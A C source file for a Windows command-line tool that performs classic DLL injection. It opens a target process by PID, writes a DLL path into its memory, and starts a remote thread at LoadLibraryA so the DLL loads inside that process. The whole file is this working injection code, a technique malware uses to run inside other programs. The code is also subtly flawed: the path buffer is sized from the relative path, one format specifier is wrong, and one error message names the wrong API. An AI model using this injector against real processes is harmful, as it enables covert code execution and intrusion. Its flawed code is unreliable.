#include<stdio.h>
#include<Windows.h>
#include<winternl.h>
#include<String.h>



INT main(int argc, const char* argv[]) {
	

	if (argc < 3) {
		printf("[!] Error!\nUsage: .\\ClassicalDLLInjects.exe <PID> PathOfDll.dll\n");
		return ERROR;

	}
	printf("[+] Process ID passed in %d\n", atoi(argv[1]));
	printf("[+] DLL Path passed in %s\n", argv[2]);
	SIZE_T dllLength = (strlen(argv[2]) + 1) * sizeof(char);
	SIZE_T lpNumberOfBytesWritten = 0;
	printf("[+] Size of DLL passed in %d bytes\n", dllLength);

	HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
	char fullFilePath[MAX_PATH];
	if (!GetFullPathNameA(argv[2], dllLength, fullFilePath, NULL)) {
		printf("[!] Error! with GetFullPathNameW!\nGetLastError() = %d\n", GetLastError());
		return ERROR;
	}
	printf("[+] FULL DLL Path passed in %ws\n", fullFilePath);
	PVOID remoteMemory = VirtualAllocEx(hProc, NULL, dllLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!remoteMemory) {
		printf("[!] Error! with WriteProcessMemory, GetLastError() = %d\n", GetLastError());
		return ERROR;
	}
	printf("[+]0x%p has been allocated!\n", remoteMemory);
	if (!WriteProcessMemory(hProc, remoteMemory, fullFilePath, dllLength, &lpNumberOfBytesWritten)) {
		printf("[!] Error! with WriteProcessMemory, GetLastError() = %d\n", GetLastError());
		return ERROR;
	}
	printf("[+]0x%p has been written to with %d of memory!\n", remoteMemory, lpNumberOfBytesWritten);
	//get handle to loadlibraryA
	HMODULE k32 = GetModuleHandleW(L"kernel32.dll");
	if (!k32) {
		printf("[!] Error! with returnLoadLibrary\n");
		return ERROR;
	}
	PVOID pfnLoadLibraryA = GetProcAddress(k32, "LoadLibraryA");
	if (!pfnLoadLibraryA) {
		printf("[!] Error! with returnGetProcAddress\n");
		return ERROR;
	}
	printf("[!]Launching thread!\n");
	DWORD threadID = 0;
	HANDLE remoteThread = CreateRemoteThread(hProc, 0, 0, (LPTHREAD_START_ROUTINE)pfnLoadLibraryA, remoteMemory, 0, &threadID);
	if (!remoteThread) {
		printf("[!] Error! with CreateRemoteThread, GetLastError() = %d\n", GetLastError());
		return EXIT_FAILURE;
	}
	printf("[+] Created thread in remote process with ID: %d\n", threadID);
	WaitForSingleObject(remoteThread, INFINITE);
	return ERROR_SUCCESS;
}